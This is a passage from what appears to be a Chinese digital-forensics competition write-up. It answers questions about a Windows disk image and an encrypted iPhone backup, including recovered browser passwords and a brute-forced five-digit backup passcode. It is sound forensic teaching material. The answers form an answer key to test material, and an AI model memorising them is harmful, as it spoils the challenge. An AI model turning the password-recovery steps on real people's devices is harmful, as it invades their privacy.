&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250709131041349.png&#34; alt=&#34;image-20250709131041349&#34; style=&#34;zoom:67%;&#34; /&gt;
&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250709131000961.png&#34; alt=&#34;image-20250709131000961&#34; style=&#34;zoom:67%;&#34; /&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;585805-292292-462539-352495-691284-509212-527219-095942
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;3检材一镜像中用户最近一次打开的文件名是什么&#34;&gt;3.检材一镜像中用户最近一次打开的文件名是什么
&lt;/h2&gt;&lt;p&gt;依次点击：分析 -&amp;gt; 经典视图 -&amp;gt; 查看最后访问时间&lt;/p&gt;
&lt;p&gt;
&lt;div class=&#34;post-img-view&#34;&gt;
&lt;a data-fancybox=&#34;gallery&#34; data-caption=&#34;image-20250709134325642&#34; href=&#34;http://picture.928330.xyz/typora/image-20250709134325642.png&#34;&gt;
&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250709134325642.png&#34; alt=&#34;image-20250709134325642&#34;  /&gt;
&lt;/a&gt;
&lt;/div&gt;
&lt;/p&gt;
&lt;p&gt;最后一个文件名称为：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;列表.xlsx
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;4检材一硬盘系统分区的起始位置&#34;&gt;4.检材一硬盘系统分区的起始位置
&lt;/h2&gt;&lt;p&gt;查看系统分区：&lt;/p&gt;
&lt;p&gt;
&lt;div class=&#34;post-img-view&#34;&gt;
&lt;a data-fancybox=&#34;gallery&#34; data-caption=&#34;image-20250709134940238&#34; href=&#34;http://picture.928330.xyz/typora/image-20250709134940238.png&#34;&gt;
&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250709134940238.png&#34; alt=&#34;image-20250709134940238&#34;  /&gt;
&lt;/a&gt;
&lt;/div&gt;
&lt;/p&gt;
&lt;p&gt;分区4是引导加载程序位置，之后的分区六应该才是主系统分区（硬盘分区），起始位置为：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;649216
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;5检材一系统的版本号是多少格式xxxx&#34;&gt;5.检材一系统的版本号是多少(格式:x.x.x.x)
&lt;/h2&gt;&lt;p&gt;分析 -&amp;gt; 基本信息 -&amp;gt; 系统信息：&lt;/p&gt;
&lt;p&gt;
&lt;div class=&#34;post-img-view&#34;&gt;
&lt;a data-fancybox=&#34;gallery&#34; data-caption=&#34;image-20250709140134139&#34; href=&#34;http://picture.928330.xyz/typora/image-20250709140134139.png&#34;&gt;
&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250709140134139.png&#34; alt=&#34;image-20250709140134139&#34;  /&gt;
&lt;/a&gt;
&lt;/div&gt;
&lt;/p&gt;
&lt;p&gt;这里有两个版本号，组合在一起才是题目要求的格式&lt;/p&gt;
&lt;p&gt;在win10和win11中，第二位数字（次要版本号）固定为0：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;10.0.19042.508
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;6检材一回收站中的文件被删除前的路径&#34;&gt;6.检材一回收站中的文件被删除前的路径
&lt;/h2&gt;&lt;p&gt;分析 -&amp;gt; 基本信息 -&amp;gt; 回收站记录：&lt;/p&gt;
&lt;p&gt;
&lt;div class=&#34;post-img-view&#34;&gt;
&lt;a data-fancybox=&#34;gallery&#34; data-caption=&#34;image-20250709141748631&#34; href=&#34;http://picture.928330.xyz/typora/image-20250709141748631.png&#34;&gt;
&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250709141748631.png&#34; alt=&#34;image-20250709141748631&#34;  /&gt;
&lt;/a&gt;
&lt;/div&gt;
&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;C:/Users/rd/Desktop/iTunes(12.13.0.9).exe
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;7检材一给出最后一次修改系统时间前的时间格式-yyyy-mm-dd-hhmmss&#34;&gt;7.检材一给出最后一次修改系统时间前的时间(格式: YYYY-MM-DD HH:MM:SS)
&lt;/h2&gt;&lt;p&gt;分析 -&amp;gt; 基本信息 -&amp;gt; 系统时间变更 -&amp;gt; 时间变更记录：&lt;/p&gt;
&lt;p&gt;
&lt;div class=&#34;post-img-view&#34;&gt;
&lt;a data-fancybox=&#34;gallery&#34; data-caption=&#34;image-20250709142136256&#34; href=&#34;http://picture.928330.xyz/typora/image-20250709142136256.png&#34;&gt;
&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250709142136256.png&#34; alt=&#34;image-20250709142136256&#34;  /&gt;
&lt;/a&gt;
&lt;/div&gt;
&lt;/p&gt;
&lt;p&gt;比对各个更改时间的记录的操作时间，找出最晚操作的时间的原系统时间：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;2023-12-12 16:37:12
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;8检材一最后一次远程连接本机的时间格式-yyyy-mm-dd-hhmmss&#34;&gt;8.检材一最后一次远程连接本机的时间(格式: YYYY-MM-DD HH:MM:SS）
&lt;/h2&gt;&lt;p&gt;分析 -&amp;gt; 远程桌面 -&amp;gt; 远程连接过本机的记录：&lt;/p&gt;
&lt;p&gt;
&lt;div class=&#34;post-img-view&#34;&gt;
&lt;a data-fancybox=&#34;gallery&#34; data-caption=&#34;image-20250709142426055&#34; href=&#34;http://picture.928330.xyz/typora/image-20250709142426055.png&#34;&gt;
&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250709142426055.png&#34; alt=&#34;image-20250709142426055&#34;  /&gt;
&lt;/a&gt;
&lt;/div&gt;
&lt;/p&gt;
&lt;p&gt;查看连接成功记录，比对最晚的连接时间：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;2023-12-11 15:57:02
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;9检材一-chrome-浏览器最后一次搜索过的关键词是什么&#34;&gt;9.检材一 Chrome 浏览器最后一次搜索过的关键词是什么
&lt;/h2&gt;&lt;p&gt;分析 -&amp;gt; Chrome浏览器 -&amp;gt; 历史记录 -&amp;gt; 最后访问时间 ：&lt;/p&gt;
&lt;p&gt;
&lt;div class=&#34;post-img-view&#34;&gt;
&lt;a data-fancybox=&#34;gallery&#34; data-caption=&#34;image-20250709142606570&#34; href=&#34;http://picture.928330.xyz/typora/image-20250709142606570.png&#34;&gt;
&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250709142606570.png&#34; alt=&#34;image-20250709142606570&#34;  /&gt;
&lt;/a&gt;
&lt;/div&gt;
&lt;/p&gt;
&lt;p&gt;从url里面看出搜索内容：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;常见的诈骗话术2023
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;10检材一是否连接过-u-盘如有请给出-u-盘的-sn-码&#34;&gt;10.检材一是否连接过 U 盘,如有,请给出 U 盘的 SN 码
&lt;/h2&gt;&lt;p&gt;分析 -&amp;gt; 基本信息 -&amp;gt; USB最近使用记录 -&amp;gt; 操作时间：&lt;/p&gt;
&lt;p&gt;
&lt;div class=&#34;post-img-view&#34;&gt;
&lt;a data-fancybox=&#34;gallery&#34; data-caption=&#34;image-20250709142917357&#34; href=&#34;http://picture.928330.xyz/typora/image-20250709142917357.png&#34;&gt;
&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250709142917357.png&#34; alt=&#34;image-20250709142917357&#34;  /&gt;
&lt;/a&gt;
&lt;/div&gt;
&lt;/p&gt;
&lt;p&gt;查看接入过的最后一个设备：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;FC2005927F271
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;11检材一-edge-浏览器最早一次下载过的文件文件名是&#34;&gt;11.检材一 Edge 浏览器最早一次下载过的文件文件名是
&lt;/h2&gt;&lt;p&gt;分析 -&amp;gt; Edge浏览器 -&amp;gt; 下载记录 -&amp;gt; 结束时间倒序：&lt;/p&gt;
&lt;p&gt;
&lt;div class=&#34;post-img-view&#34;&gt;
&lt;a data-fancybox=&#34;gallery&#34; data-caption=&#34;image-20250709143212778&#34; href=&#34;http://picture.928330.xyz/typora/image-20250709143212778.png&#34;&gt;
&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250709143212778.png&#34; alt=&#34;image-20250709143212778&#34;  /&gt;
&lt;/a&gt;
&lt;/div&gt;
&lt;/p&gt;
&lt;p&gt;第一个i4tools8不知道为什么没有时间，但详细条目显示时间晚于winrar：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt; winrar-x64-624scp.exe
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;12嫌疑人访问的微博的密码的-md5-值&#34;&gt;12.嫌疑人访问的微博的密码的 MD5 值
&lt;/h2&gt;&lt;p&gt;分析 -&amp;gt; Chrome浏览器 -&amp;gt; 保存的密码：&lt;/p&gt;
&lt;p&gt;
&lt;div class=&#34;post-img-view&#34;&gt;
&lt;a data-fancybox=&#34;gallery&#34; data-caption=&#34;image-20250709143425660&#34; href=&#34;http://picture.928330.xyz/typora/image-20250709143425660.png&#34;&gt;
&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250709143425660.png&#34; alt=&#34;image-20250709143425660&#34;  /&gt;
&lt;/a&gt;
&lt;/div&gt;
&lt;/p&gt;
&lt;p&gt;微博密码是&lt;code&gt;!dfrDj*&amp;amp;j98_jUe8&lt;/code&gt;，计算MD5值：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;5cb42860b3b61ef6dd361ad556f48e05
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h1 id=&#34;检材二iphone-备份数据&#34;&gt;检材二(iPhone 备份数据)
&lt;/h1&gt;&lt;h2 id=&#34;13检材二备份的设备名称是什么&#34;&gt;13.检材二备份的设备名称是什么
&lt;/h2&gt;&lt;p&gt;分析 -&amp;gt; 基本信息 -&amp;gt; 设备信息：&lt;/p&gt;
&lt;p&gt;
&lt;div class=&#34;post-img-view&#34;&gt;
&lt;a data-fancybox=&#34;gallery&#34; data-caption=&#34;image-20250709162101944&#34; href=&#34;http://picture.928330.xyz/typora/image-20250709162101944.png&#34;&gt;
&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250709162101944.png&#34; alt=&#34;image-20250709162101944&#34;  /&gt;
&lt;/a&gt;
&lt;/div&gt;
&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&amp;#34;User&amp;#34;的iPhone
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;14检材二手机的-ios-系统版本是多少&#34;&gt;14.检材二手机的 iOS 系统版本是多少
&lt;/h2&gt;&lt;p&gt;同13题图&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;17.0
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;15检材二备份的时间是多少格式-yyyy-mm-dd-hhmmss&#34;&gt;15.检材二备份的时间是多少?(格式: YYYY-MM-DD HH:MM:SS)
&lt;/h2&gt;&lt;p&gt;同13题图&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;2023-12-09 15:02:28
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;16嫌疑人-iphone-手机给号码13502409024最后一次打电话的时间是格式-yyyy-mm-dd-hhmmss&#34;&gt;16嫌疑人 iPhone 手机给号码&amp;quot;13502409024&amp;quot;最后一次打电话的时间是(格式: YYYY-MM-DD HH:MM:SS)
&lt;/h2&gt;&lt;p&gt;当前的备份文件中没有通话记录，其实这个藏在检材一中&lt;/p&gt;
&lt;p&gt;分析 -&amp;gt; 嵌套证据识别 -&amp;gt; IOS备份：&lt;/p&gt;
&lt;p&gt;
&lt;div class=&#34;post-img-view&#34;&gt;
&lt;a data-fancybox=&#34;gallery&#34; data-caption=&#34;image-20250709171132291&#34; href=&#34;http://picture.928330.xyz/typora/image-20250709171132291.png&#34;&gt;
&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250709171132291.png&#34; alt=&#34;image-20250709171132291&#34;  /&gt;
&lt;/a&gt;
&lt;/div&gt;
&lt;/p&gt;
&lt;p&gt;给出了一个info.plist文件的地址，但他只是配置文件，我们需要回到上层目录，导出完整备份文件：&lt;/p&gt;
&lt;p&gt;
&lt;div class=&#34;post-img-view&#34;&gt;
&lt;a data-fancybox=&#34;gallery&#34; data-caption=&#34;image-20250709171433124&#34; href=&#34;http://picture.928330.xyz/typora/image-20250709171433124.png&#34;&gt;
&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250709171433124.png&#34; alt=&#34;image-20250709171433124&#34;  /&gt;
&lt;/a&gt;
&lt;/div&gt;
&lt;/p&gt;
&lt;p&gt;同时，我们也能把它添加为新检材，扫描过程中会发现这是加密后的文件，需要密码&lt;/p&gt;
&lt;p&gt;使用Passware Kit Forensic爆破，这里需要爆破的文件是Manifest.plist，从后文（22题）知道是五位数密码&lt;/p&gt;
&lt;p&gt;选择Customize Settings高级设置：&lt;/p&gt;
&lt;p&gt;
&lt;div class=&#34;post-img-view&#34;&gt;
&lt;a data-fancybox=&#34;gallery&#34; data-caption=&#34;image-20250709173210769&#34; href=&#34;http://picture.928330.xyz/typora/image-20250709173210769.png&#34;&gt;
&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250709173210769.png&#34; alt=&#34;image-20250709173210769&#34;  /&gt;
&lt;/a&gt;
&lt;/div&gt;
&lt;/p&gt;
&lt;p&gt;只保留brute-force，修改成五位数字：&lt;/p&gt;
&lt;p&gt;
&lt;div class=&#34;post-img-view&#34;&gt;
&lt;a data-fancybox=&#34;gallery&#34; data-caption=&#34;image-20250709173334793&#34; href=&#34;http://picture.928330.xyz/typora/image-20250709173334793.png&#34;&gt;
&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250709173334793.png&#34; alt=&#34;image-20250709173334793&#34;  /&gt;
&lt;/a&gt;
&lt;/div&gt;
&lt;/p&gt;
&lt;p&gt;爆破：&lt;/p&gt;
&lt;p&gt;
&lt;div class=&#34;post-img-view&#34;&gt;
&lt;a data-fancybox=&#34;gallery&#34; data-caption=&#34;image-20250709173141338&#34; href=&#34;http://picture.928330.xyz/typora/image-20250709173141338.png&#34;&gt;
&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250709173141338.png&#34; alt=&#34;image-20250709173141338&#34;  /&gt;
&lt;/a&gt;
&lt;/div&gt;
&lt;/p&gt;
&lt;p&gt;输入密码后继续分析，分析完成后刷新一下，就会多出新的检材分析结果了&lt;/p&gt;
&lt;p&gt;分析 -&amp;gt; 基本信息 -&amp;gt; 通话记录 -&amp;gt; 时间：&lt;/p&gt;
&lt;p&gt;
&lt;div class=&#34;post-img-view&#34;&gt;
&lt;a data-fancybox=&#34;gallery&#34; data-caption=&#34;image-20250709172024138&#34; href=&#34;http://picture.928330.xyz/typora/image-20250709172024138.png&#34;&gt;
&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250709172024138.png&#34; alt=&#34;image-20250709172024138&#34;  /&gt;
&lt;/a&gt;
&lt;/div&gt;
&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt; 2023-12-04 13:18:50
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;17检材二使用过的号码-iccid-是多少&#34;&gt;17.检材二使用过的号码 ICCID 是多少
&lt;/h2&gt;&lt;p&gt;同13题图&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;89860000191997734908
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;18检材二手机中高德地图最后搜索的地址&#34;&gt;18.检材二手机中高德地图最后搜索的地址
&lt;/h2&gt;&lt;p&gt;分析 -&amp;gt; 高德地图 -&amp;gt; 搜索点：&lt;/p&gt;
&lt;p&gt;
&lt;div class=&#34;post-img-view&#34;&gt;
&lt;a data-fancybox=&#34;gallery&#34; data-caption=&#34;image-20250709170611265&#34; href=&#34;http://picture.928330.xyz/typora/image-20250709170611265.png&#34;&gt;
&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250709170611265.png&#34; alt=&#34;image-20250709170611265&#34;  /&gt;
&lt;/a&gt;
&lt;/div&gt;
&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt; 双山大道3号
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;19检材二手机最后一次登陆注册hotscoin的时间是格式-yyyy-mm-ddhhmmss&#34;&gt;19.检材二手机最后一次登陆/注册&amp;quot;HotsCoin&amp;quot;的时间是(格式: YYYY-MM-DDHH:MM:SS)
&lt;/h2&gt;&lt;p&gt;HotsCoin是数字交易平台，从短信中能得到登录时间&lt;/p&gt;
&lt;p&gt;分析 -&amp;gt; 基本信息 -&amp;gt; 短信：&lt;/p&gt;
&lt;p&gt;
&lt;div class=&#34;post-img-view&#34;&gt;
&lt;a data-fancybox=&#34;gallery&#34; data-caption=&#34;image-20250709172344826&#34; href=&#34;http://picture.928330.xyz/typora/image-20250709172344826.png&#34;&gt;
&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250709172344826.png&#34; alt=&#34;image-20250709172344826&#34;  /&gt;
&lt;/a&gt;
&lt;/div&gt;
&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;2023-12-04 13:28:14
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;20检材二手机中照片img_0002的拍摄时间是格式-yyyy-mm-dd-hhmmss&#34;&gt;20.检材二手机中照片&amp;quot;IMG_0002&amp;quot;的拍摄时间是(格式: YYYY-MM-DD HH:MM:SS)
&lt;/h2&gt;&lt;p&gt;分析 -&amp;gt; 基本信息 -&amp;gt; 图片 -&amp;gt; IMG_0002：&lt;/p&gt;
&lt;p&gt;
&lt;div class=&#34;post-img-view&#34;&gt;
&lt;a data-fancybox=&#34;gallery&#34; data-caption=&#34;image-20250709172828523&#34; href=&#34;http://picture.928330.xyz/typora/image-20250709172828523.png&#34;&gt;
&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250709172828523.png&#34; alt=&#34;image-20250709172828523&#34;  /&gt;
&lt;/a&gt;
&lt;/div&gt;
&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;2023-12-06 11:08:30
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;21检材二中小西米语音-app-的bundle-id是什么&#34;&gt;21.检材二中&amp;quot;小西米语音&amp;quot; app 的Bundle ID是什么
&lt;/h2&gt;&lt;p&gt;Bundle ID是iOS应用唯一标识符，也就是包名&lt;/p&gt;
&lt;p&gt;分析 -&amp;gt; 基本信息 -&amp;gt; 应用列表 -&amp;gt; 搜索小西米语音：&lt;/p&gt;
&lt;p&gt;
&lt;div class=&#34;post-img-view&#34;&gt;
&lt;a data-fancybox=&#34;gallery&#34; data-caption=&#34;image-20250709173624166&#34; href=&#34;http://picture.928330.xyz/typora/image-20250709173624166.png&#34;&gt;
&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250709173624166.png&#34; alt=&#34;image-20250709173624166&#34;  /&gt;
&lt;/a&gt;
&lt;/div&gt;
&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;com.titashow.tangliao
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;22检材二中浏览器最后一次搜索的关键词是什么&#34;&gt;22.检材二中浏览器最后一次搜索的关键词是什么
&lt;/h2&gt;&lt;p&gt;浏览器不是uc浏览器，指的是safari&lt;/p&gt;
&lt;p&gt;分析 -&amp;gt; Safari -&amp;gt; 搜索历史：&lt;/p&gt;
&lt;p&gt;
&lt;div class=&#34;post-img-view&#34;&gt;
&lt;a data-fancybox=&#34;gallery&#34; data-caption=&#34;image-20250709173822647&#34; href=&#34;http://picture.928330.xyz/typora/image-20250709173822647.png&#34;&gt;
&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250709173822647.png&#34; alt=&#34;image-20250709173822647&#34;  /&gt;
&lt;/a&gt;
&lt;/div&gt;
&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;ios备份密码忘了怎么办 五位纯数字
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;这里也就是在提示前面的加密备份文件的密码&lt;/p&gt;
&lt;h2 id=&#34;23嫌疑人和洗钱人员约定电子钱包的品牌是什么-如有多个用顿号分隔&#34;&gt;23.嫌疑人和洗钱人员约定电子钱包的品牌是什么, 如有多个用顿号分隔
&lt;/h2&gt;&lt;p&gt;微信聊天记录和信息里都没有相关信息，其他应用里面只有小西米语音有可能了&lt;/p&gt;
&lt;p&gt;分析 -&amp;gt; 其他应用 -&amp;gt; 小西米语音 -&amp;gt; 在线连麦平台 -&amp;gt; 文件分类 -&amp;gt; SQLite 文件&lt;/p&gt;
&lt;p&gt;其他应用是耗时分析，火眼不会自动分析，需要手动进行选择分析&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;本来应该是有im5db这个数据库的，我的分析结果里面没有，其他六个都有，也许是因为后缀的原因？&lt;/p&gt;
&lt;p&gt;所以直接沿着下面这个路径找了：&lt;/p&gt;
&lt;p&gt;/Documents/IM5_CN/9031bc3c805ac5e55ecaa151092c2c4b/IM5_storage/1399634813467579522/im5db&lt;/p&gt;&lt;/blockquote&gt;
&lt;p&gt;查看message表的content字段：&lt;/p&gt;
&lt;p&gt;
&lt;div class=&#34;post-img-view&#34;&gt;
&lt;a data-fancybox=&#34;gallery&#34; data-caption=&#34;image-20250709180909839&#34; href=&#34;http://picture.928330.xyz/typora/image-20250709180909839.png&#34;&gt;
&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250709180909839.png&#34; alt=&#34;image-20250709180909839&#34;  /&gt;
&lt;/a&gt;
&lt;/div&gt;
&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;imToken、Bitcoin
